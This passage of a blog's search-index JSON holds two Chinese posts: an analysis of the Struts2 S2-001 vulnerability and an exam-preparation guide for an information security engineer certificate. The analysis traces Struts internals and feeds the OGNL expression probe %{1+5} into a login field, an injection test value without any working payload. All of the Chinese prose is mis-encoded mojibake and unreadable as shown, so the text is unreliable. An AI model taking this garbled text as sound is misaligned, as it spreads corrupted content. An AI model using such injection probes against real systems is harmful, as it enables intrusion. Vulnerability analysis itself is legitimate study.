ActionMapperï¼Œåˆ¤æ–­è¯¥è¯·æ±‚æ˜¯å¦éœ€è¦å¤„ç†ã€‚ å¦‚æœè¯¥è¯·æ±‚éœ€è¦å¤„ç†ï¼ŒFilterDispatcherä¼šåˆ›å»ºä¸€ä¸ª ActionProxy æ¥è¿›è¡Œåç»­çš„å¤„ç†ã€‚ ActionProxy æ‹¿ç€HTTPè¯·æ±‚ï¼Œè¯¢é—® struts.xml è¯¥è°ƒç”¨å“ªä¸€ä¸ª Action è¿›è¡Œå¤„ç†ã€‚ å½“çŸ¥é“ç›®æ ‡Actionä¹‹åï¼Œå®ä¾‹åŒ–ä¸€ä¸ªActionInvocationæ¥è¿›è¡Œè°ƒç”¨ã€‚ ç„¶åè¿è¡Œåœ¨Actionä¹‹å‰çš„æ‹¦æˆªå™¨ï¼Œå›¾ä¸­å°±æ˜¯æ‹¦æˆªå™¨1ã€2ã€3ã€‚ è¿è¡ŒActionï¼Œç”Ÿæˆä¸€ä¸ªResultã€‚ Resultæ ¹æ®é¡µé¢æ¨¡æ¿å’Œæ ‡ç­¾åº“ï¼Œç”Ÿæˆè¦å“åº”çš„å†…å®¹ã€‚ æ ¹æ®å“åº”é€†åºè°ƒç”¨æ‹¦æˆªå™¨ï¼Œç„¶åç”Ÿæˆæœ€ç»ˆçš„å“åº”å¹¶è¿”å›ç»™WebæœåŠ¡å™¨ã€‚ ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:3:1","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.2 ä»£ç è°ƒè¯• é¦–å…ˆåœ¨index.jspä¸­è¾“å…¥æ•°å€¼å¹¶æäº¤åï¼Œæ ¹æ®web.xmlä¸­é…ç½®çš„è¿‡æ»¤å™¨ï¼Œä¼šåˆ°è¾¾org.apache.struts2.dispatcher.FilterDispatcherï¼Œç„¶ååˆ¤æ–­ä¸ºéœ€è¦å¤„ç†è¯·æ±‚ï¼Œåˆ›å»ºä¸€ä¸ªActionProxyã€‚ActionProxyæ ¹æ®struts.xmlé…ç½®ç¡®å®šè°ƒç”¨å“ªä¸ªActionè¿›è¡Œå¤„ç†ï¼ŒçŸ¥é“ç›®æ ‡Actionåï¼Œä¼šå®ä¾‹åŒ–ä¸€ä¸ªActionInvocationå»è°ƒç”¨org.example.s2001.action.LoginActionã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå°±ä¼šå…ˆå…è®¸ç›¸åº”çš„æ‹¦æˆªå™¨ã€‚ 3.2.1 æ‹¦æˆªå™¨ åœ¨usernameå­—æ®µè¾“å…¥%{1+5}ï¼Œç‚¹å‡»Submitï¼ŒFilterDispatcherä¸‹doFilterè¿›è¡Œè¿‡æ»¤å™¨è°ƒåº¦ï¼Œ æˆ‘ä»¬å…³æ³¨ParametersInterceptoræ‹¦æˆªå™¨ï¼Œåœ¨doInterceptè¿™é‡Œæ‰“äº†è¯¥æ–­ç‚¹ï¼Œè·Ÿè¸ªå‚æ•°ä¼ é€’ã€‚ å¯ä»¥çœ‹åˆ°ParametersInterceptor141è¡Œä¸­çš„doInterceptï¼Œåœ¨159å¤„æ‰§è¡ŒsetParameters(action, stack, parameters)ï¼Œè·Ÿè¸ªä¸‹å»ï¼Œæ­¤æ—¶å †æ ˆparametersä¿å­˜æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ã€‚ è¿›å…¥setParametersï¼Œè¯¥æ–¹æ³•å°†æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®è¿›è¡Œäº†ä¿å­˜: // com.opensymphony.xword2.interceptor.ParametersInterceptor#doIntercept protected void setParameters(Object action, ValueStack stack, final Map parameters) { ParameterNameAware parameterNameAware = (action instanceof ParameterNameAware) ? (ParameterNameAware) action : null; Map params = null; if( ordered ) { params = new TreeMap(getOrderedComparator()); params.putAll(parameters); } else { params = new TreeMap(parameters); // ä¿å­˜å‚æ•° } for (Iterator iterator = params.entrySet().iterator(); iterator.hasNext();) { Map.Entry entry = (Map.Entry) iterator.next(); String name = entry.getKey().toString(); boolean acceptableName = acceptableName(name) \u0026\u0026 (parameterNameAware == null || parameterNameAware.acceptableParameterName(name)); if (acceptableName) { Object value = entry.getValue(); try { stack.setValue(name, value); // ä¿å­˜å‚æ•°,å‚æ•°å…¥æ ˆ } catch (RuntimeException e) { ... } } } doIntercept:167 return invocation.invoke();ï¼Œæ¥ä¸‹å»ä¼šç»è¿‡ä¸€ç³»åˆ—å…¶ä»–çš„æ‹¦æˆªå™¨ åŠ è½½å®Œæ‹¦æˆªå™¨åï¼Œä¼šè°ƒç”¨invocation.invoke(ä¹Ÿå°±æ˜¯DefaultActionInvocation çš„invoke()) invokeä¸­ä¼šè°ƒç”¨invokeActionOnly,è·Ÿè¿› // public String invokeActionOnly() throws Exception { return invokeAction(getAction(), proxy.getConfig()); } invokeActionOnlyæ¥ç€è°ƒç”¨è‡ªèº«invokeactionï¼Œç»§ç»­è·Ÿè¿› invokeactioné€šè¿‡åå°„æ–¹å¼è°ƒç”¨ç”¨æˆ·actioné‡Œçš„executeï¼Œå›åˆ°æˆ‘ä»¬è‡ªå·±å†™çš„LoginAction.javaï¼Œå¼€å§‹å¤„ç†ç”¨æˆ·å±‚é€»è¾‘ã€‚ // public String execute() throws Exception { if ((this.username.isEmpty()) || (this.password.isEmpty())) { return \"error\"; } if ((this.username.equalsIgnoreCase(\"admin\")) \u0026\u0026 (this.password.equals(\"admin\"))) { return \"success\"; } return \"error\"; } 3.2.2 Result åœ¨å¤„ç†å®Œç”¨æˆ·é€»è¾‘åä¼šè°ƒç”¨DefaultActionInvocation çš„executeResult()å¤„ç†è¯·æ±‚ç»“æœï¼Œè·Ÿè¿› // com.opensymphony.xword2.DefaultActionInvocation#executeResult private void executeResult() throws Exception { result = createResult(); String timerKey = \"executeResult: \"+getResultCode(); try { UtilTimerStack.push(timerKey); if (result != null) { result.execute(this); } else if (resultCode != null \u0026\u0026 !Action.NONE.equals(resultCode)) { ... } else { ... } } finally { UtilTimerStack.pop(timerKey); } } executeResultä¼šè°ƒç”¨resultå®ç°ç±»StrutsResultSupportä¸‹çš„executeè¿›è¡Œå¤„ç†ï¼Œ // com.apache.struts2.dispatcher#execute public void execute(ActionInvocation invocation) throws Exception { this.lastFinalLocation = this.conditionalParse(this.location, invocation); this.doExecute(this.lastFinalLocation, invocation); } è°ƒç”¨æ ˆï¼šexecute:177â€“\u003econditionalParse:190â€“\u003etranslateVariables:56â€“\u003etranslateVariables:100ï¼Œä¸é‡è¦ã€‚ è·Ÿè¿›doExecuteï¼Œè·Ÿè¿›org.apache.struts2.dispatcher.ServletDispatcherResultï¼Œ // com.apache.struts2.dispatcher.ServletDispatcherResult#doExecute public void doExecute(String finalLocation, ActionInvocation invocation) throws Exception { if (log.isDebugEnabled()) { log.debug(\"Forwarding to location \" + finalLocation); } PageContext pageContext = ServletActionContext.getPageContext(); if (pageContext != null) { pageContext.include(finalLocation); } else { HttpServletRequest request = ServletActionContext.getRequest(); HttpServletResponse response = ServletActionContext.getResponse(); RequestDispatcher dispatcher = request.getRequestDispatcher(finalLocation); if (dispatcher == null) { response.sendError(404, \"result '\" + finalLocation + \"' not found\"); return; } if (!response.isCommitted() \u0026\u0026 request.getAttribute(\"javax.servlet.include.servlet_path\") == null) { request.setAttribute(\"struts.view_uri\", finalLocation); request.setAttribute(\"struts.request_uri\", request.getRequestURI()); dispatcher.forward(request, response); //è·Ÿè¿› } else { dispatcher.include(request, response); ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:3:2","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å››ã€ä¿®å¤ è¿™é‡Œæœ€ç»ˆåŠ å…¥çš„å¾ªç¯é€’å½’æ·±åº¦åˆ¤æ–­ï¼Œå½“å®Œæˆè§£æä¹‹åå°±ç›´æ¥è·³å‡ºã€‚ ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:4:0","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å‚è€ƒæ–‡ç« ï¼š Struts2 æ¼æ´åˆ†æç¯å¢ƒæ­å»º â€”â€” å­¦ä¹ S2ç¯å¢ƒæ­å»ºã€‚ Macä¸‹å®‰è£…é…ç½®Tomcat 9, Homebrewå®‰è£…Tomcat ","date":"2023-02-13","objectID":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:5:0","tags":["æ¼æ´åˆ†æ","Java","Struts2"],"title":"S2-001æ¼æ´åˆ†æ","uri":"/posts/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"ä¸€ã€ç®€ä»‹ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:1:0","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"1.1 è½¯è€ƒä»‹ç» è½¯è€ƒï¼Œå³è®¡ç®—æœºæŠ€æœ¯ä¸è½¯ä»¶ä¸“ä¸šæŠ€æœ¯èµ„æ ¼ï¼ˆæ°´å¹³ï¼‰è€ƒè¯•ï¼Œä»¥ä¸‹ä¸ºå®˜æ–¹ä»‹ç»ï¼š è®¡ç®—æœºæŠ€æœ¯ä¸è½¯ä»¶ä¸“ä¸šæŠ€æœ¯èµ„æ ¼ï¼ˆæ°´å¹³ï¼‰è€ƒè¯•ï¼ˆä»¥ä¸‹ç®€ç§°è®¡ç®—æœºè½¯ä»¶èµ„æ ¼è€ƒè¯•ï¼‰æ˜¯åŸä¸­å›½è®¡ç®—æœºè½¯ä»¶ä¸“ä¸šæŠ€æœ¯èµ„æ ¼å’Œæ°´å¹³è€ƒè¯•ï¼ˆç®€ç§°è½¯ä»¶è€ƒè¯•ï¼‰çš„å®Œå–„ä¸å‘å±•ã€‚è®¡ç®—æœºè½¯ä»¶èµ„æ ¼è€ƒè¯•æ˜¯ç”±å›½å®¶äººåŠ›èµ„æºå’Œç¤¾ä¼šä¿éšœéƒ¨ã€å·¥ä¸šå’Œä¿¡æ¯åŒ–éƒ¨é¢†å¯¼ä¸‹çš„å›½å®¶çº§è€ƒè¯•ï¼Œå…¶ç›®çš„æ˜¯ç§‘å­¦ã€å…¬æ­£åœ°å¯¹å…¨å›½è®¡ç®—æœºä¸è½¯ä»¶ä¸“ä¸šæŠ€æœ¯äººå‘˜è¿›è¡ŒèŒä¸šèµ„æ ¼ã€ä¸“ä¸šæŠ€æœ¯èµ„æ ¼è®¤å®šå’Œä¸“ä¸šæŠ€æœ¯æ°´å¹³æµ‹è¯•ã€‚ æ›´å¤šä¿¡æ¯è§å®˜ç½‘ï¼šhttps://www.ruankao.org.cn/ã€‚ è½¯è€ƒå…±è®¾ç½®äº†27ä¸ªä¸“ä¸šèµ„æ ¼ï¼Œæ¶µç›–5ä¸ªä¸“ä¸šé¢†åŸŸï¼Œ 3ä¸ªçº§åˆ«å±‚æ¬¡ï¼ˆåˆçº§ã€ä¸­çº§ã€é«˜çº§ï¼‰ï¼Œèµ„æ ¼è®¾ç½®è§ä¸‹å›¾ï¼š æœ¬æ–‡åŸºäºä¸ªäººç»å†ï¼Œå‘å¤§å®¶åˆ†äº«è½¯è€ƒä¸­çº§èµ„æ ¼çš„ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆæŠ¥è€ƒç»éªŒã€‚ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:1:1","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"1.2 ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆï¼Œè€ƒè¯•ç§‘ç›®å…±ä¸¤ç§‘ï¼š ï¼ˆ1ï¼‰ç½‘ç»œä¿¡æ¯å®‰å…¨åŸºç¡€çŸ¥è¯†å’ŒæŠ€æœ¯ï¼Œè€ƒè¯•æ—¶é—´ä¸º150åˆ†é’Ÿï¼Œç¬”è¯•ï¼Œ75é“é€‰æ‹©é¢˜ï¼Œ45åˆ†é€šè¿‡ï¼› ï¼ˆ2ï¼‰ç½‘ç»œä¿¡æ¯å®‰å…¨å·¥ç¨‹ä¸ç»¼åˆåº”ç”¨å®è·µï¼Œè€ƒè¯•æ—¶é—´ä¸º150åˆ†é’Ÿï¼Œç¬”è¯•ï¼Œ5/6é“é—®ç­”é¢˜ï¼Œ45åˆ†é€šè¿‡ï¼› 1.ä¿¡æ¯å®‰å…¨åŸºç¡€çŸ¥è¯† ä¸Šåˆè€ƒè¯•å†…å®¹ä¸ºåŸºç¡€çŸ¥è¯†å’ŒæŠ€æœ¯ï¼Œå•é€‰é¢˜ï¼Œä½†æ˜¯çŸ¥è¯†é¢å¹¿ï¼Œå†…å®¹ç»†è‡´ï¼Œå› æ­¤åªè¦æœ‰é’ˆå¯¹æ€§åœ°åŠ å¼ºå¤ä¹ ï¼Œå¤šåˆ·åˆ·é¢˜ï¼Œä¸€èˆ¬æ²¡ä»€ä¹ˆé—®é¢˜ã€‚ä¸‹å›¾ä¸ºçŸ¥ä¹ç½‘å‹æ•´ç†çš„çŸ¥è¯†ç‚¹è¡¨æ ¼ã€‚ 2.ä¿¡æ¯å®‰å…¨åº”ç”¨æŠ€æœ¯ ä¸‹åˆè¯•é¢˜å†…å®¹ä¸ºç»¼åˆåº”ç”¨å®è·µï¼Œéƒ½æ˜¯é—®ç­”é¢˜ï¼Œå‘ˆç”±æ˜“åˆ°éš¾åˆ†å¸ƒã€‚å‰é¢çš„é—®é¢˜å°‘ï¼Œåé¢çš„é—®é¢˜å¤šè€Œå¤æ‚ï¼Œéœ€è¦å¤šå¤ä¹ ï¼Œæœ‰äº›éš¾åº¦ã€‚ 2020å¹´ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆè€ƒè¯•å¤§çº²è¿›è¡Œäº†æ”¹ç‰ˆï¼Œå…·ä½“è€ƒè¯•å†…å®¹ä»¥æ–°ç‰ˆçš„ã€Šä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆè€ƒè¯•å¤§çº²ã€‹ä¸ºå‡†ã€‚ å‡†å¤‡å¤‡è€ƒèµ„æ–™æ—¶ï¼Œä¹Ÿéœ€è¦æ³¨æ„ç‰ˆæœ¬ï¼Œæ–°ç‰ˆæœ¬å¢åŠ äº†ç‰©è”ç½‘ã€äº‘è®¡ç®—ã€äººå·¥æ™ºèƒ½ã€å¤§æ•°æ®ç­‰æ–°å…´æŠ€æœ¯ã€‚ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:1:2","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"äºŒã€æŠ¥è€ƒæµç¨‹ï¼š ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:2:0","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"å…³æ³¨åŠ¨æ€ï¼š ä¸­å›½è®¡ç®—æœºæŠ€æœ¯èŒä¸šèµ„æ ¼ç½‘ï¼šæä¾›ç›¸å…³æ”¿ç­–ã€åŠ¨æ€ã€è€ƒè¯•å®‰æ’ å…³æ³¨è€ƒè¯•å®‰æ’ï¼Œã€Š202xå¹´å…¨å›½è®¡ç®—æœºæŠ€æœ¯ä¸è½¯ä»¶ä¸“ä¸šæŠ€æœ¯èµ„æ ¼(æ°´å¹³)è€ƒè¯•å·¥ä½œå®‰æ’ã€‹ï¼Œä¼šå†™è€ƒè¯•æ—¶é—´ï¼Œæ ¹æ®è¿™ä¸ªæ—¶é—´å»å®‰æ’ï¼Œå»å¹´æŠ¥åæ˜¯è€ƒè¯•å‰2ä¸ªæœˆã€‚ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:2:1","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"è€ƒè¯•æŠ¥åï¼š è½¯è€ƒç½‘ä¸ŠæŠ¥åå¹³å° é€šè¿‡ç½‘ä¸ŠæŠ¥åå¹³å°è¿›è¡ŒæŠ¥åï¼Œéœ€è¦è¿›è¡Œä¿¡æ¯å¡«æŠ¥ï¼Œèº«ä»½ç¡®è®¤ï¼Œç½‘ä¸Šç¼´è´¹ç­‰ï¼Œè€ƒè¯•æŠ¥åè´¹ä¸ºï¿¥114ã€‚ æŠ¥åç¼´è´¹å®Œæˆä¹‹åï¼Œå°±å¯ä»¥å¼€å§‹å¤‡è€ƒäº†ã€‚ ç­‰åˆ°è€ƒå‰ä¸€å‘¨å·¦å³ï¼Œå¯ä»¥æ‰“å°å‡†è€ƒè¯äº†ï¼Œè¿™æ—¶å€™ä¹Ÿå°±çŸ¥é“è‡ªå·±åœ¨å“ªä¸ªè€ƒåœºäº†ã€‚ ä»”ç»†æ ¸å¯¹å‡†è€ƒè¯å†…å®¹ï¼Œå¹¶æŒ‰ç…§è¦æ±‚å‚åŠ è€ƒè¯•ã€‚ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:2:2","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"ä¸‰ã€å¦‚ä½•å¤‡è€ƒ çŸ¥ä¹ï¼šå¦‚ä½•å¤‡è€ƒè½¯è€ƒä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆï¼Ÿhttps://www.zhihu.com/question/314497181 å»å¹´æŠ¥åæ—¶é—´ä¸º8æœˆ29æ—¥-9æœˆ7æ—¥ï¼Œè€ƒè¯•æ—¶é—´ä¸º11æœˆ5æ—¥ï¼Œä¸­é—´æœ‰2ä¸ªæœˆæ—¶é—´å¤‡è€ƒï¼Œå½“ç„¶æœ€å¥½è¿˜æ˜¯æå‰å¼€å§‹å‡†å¤‡ã€‚ ä¸€èˆ¬å»ºè®®4-5ä¸ªæœˆï¼Œå¯¹äºé›¶åŸºç¡€çš„å­¦å‘˜æ¥è¯´ï¼Œæœ‰å¯èƒ½æ—¶é—´ä¼šå¾ˆé•¿ï¼Œè¦æƒ³å…¨é¢æŒæ¡çŸ¥è¯†è€ƒç‚¹ï¼Œå¿…é¡»åƒé€æ•™æå’Œè€ƒè¯•å¤§çº²ï¼Œå®‰æ’å……è¶³çš„å­¦ä¹ æ—¶é•¿ï¼Œå°†è½¯è€ƒçš„ä¹¦ç±çŸ¥è¯†ç‚¹åƒé€åƒæ‰å®ã€‚ å¤‡è€ƒéœ€è¦çš„ææ–™ï¼Œä¸€èˆ¬å°±æ˜¯å®˜æ–¹æ•™æã€Šä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆæ•™ç¨‹ã€‹+å†å¹´çœŸé¢˜ï¼ˆå«è§£æï¼‰ï¼Œå…¶ä»–è¿˜å¯ä»¥æœ‰è§†é¢‘æˆ–éŸ³é¢‘+è¯¾ä»¶+å¹²è´§èµ„æ–™+å…¶ä»–èµ„æ–™ã€‚æŠ¥ç­å­¦ä¹ å’Œæ•™è¾…ææ–™çœ‹ä¸ªäººå§ã€‚ æ ¸å¿ƒè¿˜æ˜¯ç†Ÿè¯»æ•™æ+å‡†å¤‡å¤ä¹ èµ„æ–™+é¢˜æµ·æˆ˜æœ¯ã€‚ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:3:0","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"å¤‡è€ƒææ–™ï¼š æ•™æï¼ˆç¬¬äºŒç‰ˆï¼‰ï¿¥40ï¼ˆç›—ç‰ˆï¼‰ è½¯è€ƒé€šAPP ï¿¥0 ã€Šä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ5å¤©ä¿®ç‚¼ã€‹ï¼ˆç¬¬äºŒç‰ˆï¼‰ï¿¥34.2 ã€Šä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆè€ƒå‰å†²åˆº100é¢˜ã€‹ï¿¥30 ä¹°æ•™æå’Œæ•™è¾…éœ€è¦æ³¨æ„ä¸€ä¸‹ç‰ˆæœ¬æ˜¯å¦æœ€æ–°ã€‚æ³¨æ„æŸ¥çœ‹å®˜ç½‘æ¯å¹´çš„è€ƒè¯•å¤§çº²æœ‰æ²¡æœ‰å˜åŒ–ï¼Œæ•™ç¨‹å®˜ç½‘æœ‰è´­ä¹°é“¾æ¥ã€‚ æˆ‘çš„å¤‡è€ƒæ—¶é—´ï¼š2ä¸ªæœˆï¼Œä¸­é—´æœ‰ä¸ªåä¸€å‡æœŸå¯ä»¥å…¨å¤©å­¦ä¹  ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:3:1","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"å¤‡è€ƒå®‰æ’ï¼š 1.åˆ©ç”¨ç¢ç‰‡æ—¶é—´åˆ·é¢˜ï¼› 2.é€šè¯»ä¸€éè€ƒè¯•å¤§çº²ï¼ŒçŸ¥é“è€ƒä»€ä¹ˆï¼›é€šè¯»ä¸€éæ•™æï¼Œå¤§æ¦‚æœ‰ä¸ªå°è±¡ï¼›å¯¹ç…§ç€å¤§çº²ï¼ŒæŠŠé‡ç‚¹å†…å®¹å¤šçœ‹çœ‹ï¼› 3.é”™é¢˜é›†ï¼Œåˆ·é¢˜è¿‡ç¨‹ä¸­é‡åˆ°çš„é”™é¢˜ï¼Œä¸å…‰çœ‹è§£æï¼Œè¿˜è¦å»ç¿»ç¿»ä¹¦ï¼Œå¤ä¹ çŸ¥è¯†ç‚¹ï¼ŒåŠ æ·±å°è±¡ï¼› 4.ç»¼åˆåº”ç”¨éƒ¨åˆ†çŸ¥è¯†ç‚¹å¤šçœ‹å¤šå­¦ã€‚ 5.æ•™è¾…ä¸­çš„é‡ç‚¹åƒé€ã€‚ æ€»çš„æ¥è¯´å°±è¿˜æ˜¯ç†Ÿè¯»æ•™æã€é¢˜æµ·æˆ˜æœ¯ã€‚ ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:3:2","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"å››ã€è€ƒåæŸ¥åˆ† ","date":"2023-02-06","objectID":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/:4:0","tags":["è¯ä¹¦"],"title":"è½¯è€ƒ-ä¸­çº§ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ","uri":"/posts/%E8%BD%AF%E8%80%83-%E4%B8%AD%E7%BA%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/"},{"categories":["èŒä¸šç”Ÿæ¶¯"],"content":"æŸ¥æˆç»©ï¼š ä¸¤é—¨ç§‘ç›®æˆç»©éƒ½åœ¨45åˆ†ä»¥ä¸Šåˆ™é€šè¿‡è€ƒè¯•ã€‚ å»å¹´æŸ¥æˆç»©çš„æ—¶é—´æ˜¯12æœˆ15æ—¥ï¼ŒæŸ¥è¯¢æ–¹å¼å¦‚ä¸‹ï¼š æ–¹å¼ä¸€ï¼šç™»å½•ä¸­å›½è®¡ç®—æœºæŠ€æœ¯èŒä¸šèµ„æ ¼ç½‘-æˆç»©æŸ¥è¯¢å…¥å£ï¼šè¾“å…¥â€œå§“åâ€ã€â€œå‡†è€ƒè¯å·â€ï¼ˆæˆ–â€œè¯ä»¶å·ç â€ï¼‰æŸ¥è¯¢æˆç»©ã€‚ æ–¹å¼äºŒï¼šç™»å½•ä¸­å›½è®¡ç®—æœºæŠ€æœ¯èŒä¸šèµ„æ ¼ç½‘-æŠ¥åç³»ç»Ÿï¼šè¾“å…¥æ³¨å†Œè´¦å·å’Œå¯†ç æŸ¥è¯¢æˆç»©ï¼› è€ƒè¯•é€šè¿‡åï¼Œéœ€è¦å†ç­‰æ®µæ—¶é—´å°±å¯ä»¥æŸ¥è¯¢è¯ä¹¦ï¼Œè·å–è¯ä¹¦ç®¡ç†ç¼–å·ã€‚ 